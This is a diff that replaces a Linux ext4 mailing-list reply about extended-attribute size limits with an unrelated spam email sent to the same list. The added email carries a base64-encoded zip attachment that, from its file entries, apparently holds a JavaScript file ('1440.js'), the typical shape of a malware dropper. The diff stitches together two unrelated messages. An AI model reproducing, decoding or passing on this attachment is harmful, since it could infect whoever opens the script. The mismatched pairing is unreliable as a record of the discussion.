@@ -1,116 +1,79 @@
-From: Andreas Dilger <adilger@dilger.ca>
-Subject: Re: [PATCH 09/32] ext4: extended attribute value size limit is
- enforced by vfs
-Date: Thu, 22 Jun 2017 13:40:25 -0600
-Message-ID: <B0650C7F-0982-4D10-ADC9-925B376D92BE@dilger.ca>
-References: <20170621212142.16581-1-tahsin@google.com>
- <20170621212142.16581-9-tahsin@google.com>
- <20170622180243.GC4728@birch.djwong.org>
-Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Content-Type: multipart/signed;
- boundary="Apple-Mail=_766C4A12-92AA-4705-B8BB-4C80A41E1C42";
- protocol="application/pgp-signature"; micalg=pgp-sha1
-Cc: Tahsin Erdogan <tahsin@google.com>, Jan Kara <jack@suse.cz>,
-        Theodore Ts'o <tytso@mit.edu>, linux-ext4@vger.kernel.org,
-        linux-kernel@vger.kernel.org
-To: "Darrick J. Wong" <darrick.wong@oracle.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170622180243.GC4728@birch.djwong.org>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+From: <koopk@madisonnjps.org>
+Subject: (unknown)
+Date: Thu, 22 Jun 2017 20:24:47 -0000
+Message-ID: <149816308754.12492.15068220219953093253@saturn-internet.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="0031586918070.zip"
+Content-Transfer-Encoding: base64
+To: <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from 178.161.219.7.dyn.v4.saturn-internet.ru ([178.161.219.7]:52197
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751147AbdFVUYv (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>);
+        Thu, 22 Jun 2017 16:24:51 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-
---Apple-Mail=_766C4A12-92AA-4705-B8BB-4C80A41E1C42
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-	charset=us-ascii
-
-On Jun 22, 2017, at 12:02 PM, Darrick J. Wong <darrick.wong@oracle.com> =
-wrote:
->=20
-> On Wed, Jun 21, 2017 at 02:21:19PM -0700, Tahsin Erdogan wrote:
->> EXT4_XATTR_MAX_LARGE_EA_SIZE definition in ext4 is currently unused.
->> Besides, vfs enforces its own 64k limit which makes the 1MB limit in
->> ext4 redundant. Remove it.
->=20
-> Just FYI I believe the 64k VFS limit exists because XFS is the only fs
-> to allow large xattr values, and its maximum is 64k (on-disk field =
-size
-> limitation).
->=20
-> I don't know if anyone actually wants larger values?  Now could be a
-> time to have such a conversation, if anyone is so interested.
-
-The EXT4_XATTR_MAX_LARGE_EA_SIZE limit of 1MB was also totally =
-arbitrary,
-but a reasonable upper limit for the atomic get/set interface used by
-xattrs.  The underlying disk format could actually store xattrs of any =
-size.
-
-I'd think if we want to get huge xattrs that they should be handled by
-having separate streams (e.g. open file descriptor, ioctl/syscall to =
-select
-a different stream number on that file) so that the data doesn't have to =
-be
-completely rewritten any time it is modified, but streams are frowned =
-upon
-by many Linux developers for security reasons so will probably be a =
-no-go.
-
-Cheers, Andreas
-
-> --D
->=20
->>=20
->> Signed-off-by: Tahsin Erdogan <tahsin@google.com>
->> ---
->> fs/ext4/ext4.h | 6 ------
->> 1 file changed, 6 deletions(-)
->>=20
->> diff --git a/fs/ext4/ext4.h b/fs/ext4/ext4.h
->> index 5d5fc0d0e2bc..2cdd6070e348 100644
->> --- a/fs/ext4/ext4.h
->> +++ b/fs/ext4/ext4.h
->> @@ -2220,12 +2220,6 @@ struct mmpd_data {
->>  */
->> #define EXT4_MMP_MAX_CHECK_INTERVAL	300UL
->>=20
->> -/*
->> - * Maximum size of xattr attributes for FEATURE_INCOMPAT_EA_INODE =
-1Mb
->> - * This limit is arbitrary, but is reasonable for the xattr API.
->> - */
->> -#define EXT4_XATTR_MAX_LARGE_EA_SIZE    (1024 * 1024)
->> -
->> /*
->>  * Function prototypes
->>  */
->> --
->> 2.13.1.611.g7e3b11ae1-goog
->>=20
-
-
-Cheers, Andreas
-
-
-
-
-
-
---Apple-Mail=_766C4A12-92AA-4705-B8BB-4C80A41E1C42
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
-	filename=signature.asc
-Content-Type: application/pgp-signature;
-	name=signature.asc
-Content-Description: Message signed with OpenPGP
-
------BEGIN PGP SIGNATURE-----
-Comment: GPGTools - http://gpgtools.org
-
-iD8DBQFZTB0rpIg59Q01vtYRAo3KAJ9N2HAdAUjudUx5v+aSs6qSWVjQvQCdGs97
-2Gffzt0lTKA4pQWq0LdVZh0=
-=tpys
------END PGP SIGNATURE-----
-
---Apple-Mail=_766C4A12-92AA-4705-B8BB-4C80A41E1C42--
+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
